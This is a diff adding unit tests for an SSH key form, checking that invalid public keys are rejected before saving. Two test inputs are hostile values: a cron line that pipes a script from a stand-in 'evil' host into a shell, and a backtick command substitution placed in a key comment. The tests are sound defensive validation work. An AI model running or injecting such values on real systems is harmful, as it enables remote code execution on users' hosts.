@@ -294,3 +294,57 @@ test("the key form loads its stored material and hides the mode toggle when edit
   expect(textareas[1].value).toBe("PUB");
   expect(screen.queryByText("keychain.keyForm.modeGenerate")).toBeNull();
 });
+
+const VALID_PUB = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 kipavy@laptop";
+
+test("the key form refuses to save a public half that is not an SSH public key", async () => {
+  const { onSubmit, flushRef } = renderKey();
+  const [priv, pub] = Array.from(document.querySelectorAll("textarea"));
+  fireEvent.change(priv, { target: { value: "-----BEGIN OPENSSH PRIVATE KEY-----\nx" } });
+  fireEvent.change(pub, { target: { value: "* * * * * root curl http://evil/x|sh" } });
+  await act(async () => {
+    flushRef.current!();
+  });
+  // Stored, it would be written verbatim into a remote file by addKeyToHost —
+  // and the user's first symptom would be a key that imported fine and refused
+  // to deploy. Nothing is saved, and the field says why.
+  expect(onSubmit).not.toHaveBeenCalled();
+  expect(screen.getByText("keychain.keyForm.invalidPublicKey")).toBeTruthy();
+});
+
+test("the key form saves once the public half is corrected", async () => {
+  const { onSubmit, flushRef } = renderKey();
+  const [priv, pub] = Array.from(document.querySelectorAll("textarea"));
+  fireEvent.change(priv, { target: { value: "-----BEGIN OPENSSH PRIVATE KEY-----\nx" } });
+  fireEvent.change(pub, { target: { value: "not a key" } });
+  await act(async () => {
+    flushRef.current!();
+  });
+  expect(onSubmit).not.toHaveBeenCalled();
+  fireEvent.change(pub, { target: { value: VALID_PUB } });
+  await act(async () => {
+    flushRef.current!();
+  });
+  expect(onSubmit).toHaveBeenCalledTimes(1);
+  expect(onSubmit.mock.calls[0][2]).toBe(VALID_PUB);
+  expect(screen.queryByText("keychain.keyForm.invalidPublicKey")).toBeNull();
+});
+
+test("the identity form refuses to save inline key material with a bad public half", async () => {
+  const { onSubmit, flushRef } = renderIdentity();
+  fireEvent.change(screen.getByPlaceholderText("root"), { target: { value: "deploy" } });
+  fireEvent.click(screen.getByText("keychain.identityForm.noKey"));
+  fireEvent.click(screen.getByText("keychain.identityForm.newKeyInline"));
+  const textareas = Array.from(document.querySelectorAll("textarea"));
+  fireEvent.change(textareas[textareas.length - 2], {
+    target: { value: "-----BEGIN OPENSSH PRIVATE KEY-----\nx" },
+  });
+  fireEvent.change(textareas[textareas.length - 1], {
+    target: { value: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 `id`" },
+  });
+  await act(async () => {
+    flushRef.current!();
+  });
+  expect(onSubmit).not.toHaveBeenCalled();
+  expect(screen.getByText("keychain.keyForm.invalidPublicKey")).toBeTruthy();
+});
